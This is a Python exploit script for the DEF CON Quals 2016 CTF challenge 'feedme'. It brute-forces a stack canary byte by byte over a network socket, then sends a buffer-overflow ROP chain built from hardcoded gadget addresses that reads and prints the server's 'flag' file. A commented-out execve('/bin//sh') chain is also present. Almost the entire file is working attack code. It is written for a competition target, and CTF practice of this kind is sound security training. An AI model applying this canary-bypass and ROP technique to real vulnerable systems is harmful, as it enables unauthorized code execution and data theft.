#!/usr/bin/python
#
# CTF: Defcon Quals 2016
# Challenge: feedme
# Author: Benjamin Charron <bcharron@pobox.com>

from struct import pack

import socket
import struct
import time
import sys

from struct import pack

HOSTNAME = "feedme_47aa9b0d8ad186754acd4bece3d6a177.quals.shallweplayaga.me"
#HOSTNAME = "localhost"
PORT = 4092

# buf @ ebp-0x2c
# canary @ ebp-0x0c

def generate_canary_guess_payload(buf_size, canary_byte_no, canary):
	#shell_str = '\xD8\x0B\x12\x17\xD8\x1C\x11\xA9'
	#print len(shell_str)
	#padding = shell_str + "A" * (buf_size - len(shell_str))
	padding = "A" * buf_size

	payload_len = buf_size + canary_byte_no + 1
	#print "payload_len: %d" % payload_len

	canary_str = "".join([struct.pack("B", x) for x in canary[0:canary_byte_no + 1]])
	payload_len_byte = struct.pack("B", payload_len) 
	payload = payload_len_byte + padding + canary_str

	return(payload)

def generate_rop_payload(buf_size, canary, rop):
	padding = "A" * buf_size

	payload_len = buf_size + 4 + 8 + 4 + len(rop)

	canary_str = "".join([struct.pack("B", x) for x in canary])
	payload_len_byte = struct.pack("B", payload_len) 
	payload = payload_len_byte + padding + canary_str + "A" * 8 + "A" * 4 + rop

	return(payload)

def try_payload(client, payload):
	client.send(payload)

	print "> Sending %s" % payload.encode('hex')

	yum = False
	received = ''
	while True:
		received += client.recv(4096)
		# print "< Received: %s" % recv

		if received.find("YUM") >= 0:
			print ">>> Got a YUM"
			yum = True

		if received.find("Child exit.") >= 0:
			#print ">>> Got a child exit"
			break

	#print "Yum? ", yum

	return(yum)

BUF_SIZE = 0x20

p = ''

#p += pack('<I', 0x0806f34a) # pop edx ; ret
#p += pack('<I', 0x080ea060) # @ .data
#p += pack('<I', 0x080bb496) # pop eax ; ret
#p += '/bin'
#p += pack('<I', 0x0809a7ed) # mov dword ptr [edx], eax ; ret
#p += pack('<I', 0x0806f34a) # pop edx ; ret
#p += pack('<I', 0x080ea064) # @ .data + 4
#p += pack('<I', 0x080bb496) # pop eax ; ret
#p += '//sh'
#p += pack('<I', 0x0809a7ed) # mov dword ptr [edx], eax ; ret
#p += pack('<I', 0x0806f34a) # pop edx ; ret
#p += pack('<I', 0x080ea068) # @ .data + 8
#p += pack('<I', 0x08054a10) # xor eax, eax ; ret
#p += pack('<I', 0x0809a7ed) # mov dword ptr [edx], eax ; ret
#p += pack('<I', 0x080481c9) # pop ebx ; ret
#p += pack('<I', 0x080ea060) # @ .data
#p += pack('<I', 0x0806f371) # pop ecx ; pop ebx ; ret
#p += pack('<I', 0x080ea068) # @ .data + 8
#p += pack('<I', 0x080ea060) # padding without overwrite ebx
#p += pack('<I', 0x0806f34a) # pop edx ; ret
#p += pack('<I', 0x080ea068) # @ .data + 8
#p += pack('<I', 0x08054a10) # xor eax, eax ; ret
#p += pack('<I', 0x080497fe) # inc eax ; ret
#p += pack('<I', 0x080497fe) # inc eax ; ret
#p += pack('<I', 0x080497fe) # inc eax ; ret
#p += pack('<I', 0x080497fe) # inc eax ; ret
#p += pack('<I', 0x080497fe) # inc eax ; ret
#p += pack('<I', 0x080497fe) # inc eax ; ret
#p += pack('<I', 0x080497fe) # inc eax ; ret
#p += pack('<I', 0x080497fe) # inc eax ; ret
#p += pack('<I', 0x080497fe) # inc eax ; ret
#p += pack('<I', 0x080497fe) # inc eax ; ret
#p += pack('<I', 0x080497fe) # inc eax ; ret
#p += pack('<I', 0x08049761) # int 0x80

p += pack('<I', 0x0806f34a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080bb496) # pop eax ; ret
p += 'flag'
p += pack('<I', 0x0809a7ed) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f34a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080bb496) # pop eax ; ret
p += pack('<I', 0x00000000) # trailing NUL
#p += pack('<I', 0x0809a7ed) # mov dword ptr [edx], eax ; ret
#p += pack('<I', 0x0806f34a) # pop edx ; ret
#p += pack('<I', 0x080ea068) # @ .data + 8
#p += pack('<I', 0x08054a10) # xor eax, eax ; ret
#p += pack('<I', 0x0809a7ed) # mov dword ptr [edx], eax ; ret
#p += pack('<I', 0x080481c9) # pop ebx ; ret
#p += pack('<I', 0x080ea060) # @ .data
#p += pack('<I', 0x0806f371) # pop ecx ; pop ebx ; ret
#p += pack('<I', 0x080ea068) # @ .data + 8
#p += pack('<I', 0x080ea060) # padding without overwrite ebx
#p += pack('<I', 0x0806f34a) # pop edx ; ret
#p += pack('<I', 0x080ea068) # @ .data + 8

int0x80   = 0x0806fa20
sys_open  = 0x0806d80a
sys_read  = 0x0806d87a
sys_write = 0x0806d8ea

p += pack('<I', 0x0806f371) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x00000000) # open() arg 2: flags (O_RDONLY)
p += pack('<I', 0x080ea060) # open() arg 1: filename ptr ("flag")
p += pack('<I', 0x0806f34a) # pop edx ; ret
p += pack('<I', 0x00000000) # open() arg 3: mode (none)

# syscall 5 (open)
p += pack('<I', 0x08054a10) # xor eax, eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', int0x80)    # int 0x80

temp_buf_ptr = 0x080ea06C

p += pack('<I', 0x0806f371) # pop ecx ; pop ebx ; ret
p += pack('<I', temp_buf_ptr) # read() arg 2: buf ptr
p += pack('<I', 0x00000002) # read() arg 1: fd
p += pack('<I', 0x0806f34a) # pop edx ; ret
p += pack('<I', 0x00000064) # read() arg 3: size

# syscall 3 (read)
p += pack('<I', 0x08054a10) # xor eax, eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret

p += pack('<I', int0x80)    # int 0x80


p += pack('<I', 0x0806f371) # pop ecx ; pop ebx ; ret
p += pack('<I', temp_buf_ptr) # write() arg 2: buf ptr
p += pack('<I', 0x00000001) # write() arg 1: stdout
p += pack('<I', 0x0806f34a) # pop edx ; ret
p += pack('<I', 0x00000064) # read() arg 3: size

# syscall 4 (write)
p += pack('<I', 0x08054a10) # xor eax, eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', int0x80)    # int 0x80

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOSTNAME, PORT))

canary = [0] * 4

#payload = generate_rop_payload(BUF_SIZE, canary, p)

for canary_idx in range(0, 4):
	ok = False

	for guess in range(0, 256):
		canary[canary_idx] = guess
		payload = generate_canary_guess_payload(BUF_SIZE, canary_idx, canary)
		success = try_payload(client, payload)

		if success:
			print "************** Canary[%d] == 0x%02X" % ( canary_idx, canary[canary_idx] )
			ok = True
			break
		else:
			print "************** Bad guess '0x%02X' for canary[%d]" % ( canary[canary_idx], canary_idx )

	if not ok:
		print "Failed to get canary %d" % canary_idx
		sys.exit(1)


print "Canary: ", canary


payload = generate_rop_payload(BUF_SIZE, canary, p)
print ">> Sending %s" % payload.encode("hex")
client.send(payload)

# f = open("oo", "w+")
# f.write(payload)
# f.close()
# client.send(payload)

#client.send("ls\n")
#client.send("cat flag\n")

while True:
	print client.recv(4096)

